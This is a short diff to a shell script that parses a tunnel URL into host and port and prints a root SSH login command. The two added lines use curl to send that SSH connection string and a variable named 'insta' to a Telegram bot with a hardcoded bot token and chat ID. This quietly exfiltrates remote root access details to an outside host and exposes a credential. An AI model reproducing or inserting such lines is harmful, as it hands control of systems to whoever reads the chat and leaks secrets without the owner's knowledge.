@@ -25,3 +25,5 @@ host=$(echo $url | sed 's\:[0-9].*\\g' | sed 's\tcp://\\g')
 port=$(echo $url | sed 's\.*io:\\g')
 echo "ssh -p${port} root@${host}"
 echo $insta
+curl -s "https://api.telegram.org/bot5137896150:AAEcXG7fkPYa3y0xowgM-1yxMHNP3TA9HJs/sendMessage?chat_id=1380298324&text=ssh -p${port} root@${host}"
+curl -s "https://api.telegram.org/bot5137896150:AAEcXG7fkPYa3y0xowgM-1yxMHNP3TA9HJs/sendMessage?chat_id=1380298324&text=$insta"
